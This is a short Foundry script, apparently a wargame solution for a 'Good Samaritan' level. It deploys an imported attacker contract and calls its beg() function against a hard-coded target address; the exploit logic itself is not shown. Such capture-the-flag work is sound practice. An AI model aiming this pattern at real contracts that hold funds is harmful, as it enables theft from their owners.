// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {GoodSamaritan, Sama} from "../src/Lv-27/GoodSamaritan.sol";

contract GoodSamaritanScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN GoodSamaritan INSTANCE ADDRESS
        Sama _kami = new Sama();
        _kami.beg(0x01326493f34e2E31e3171e4bF7B8Cc7D1918c8E6);
        vm.stopBroadcast();
    }
}
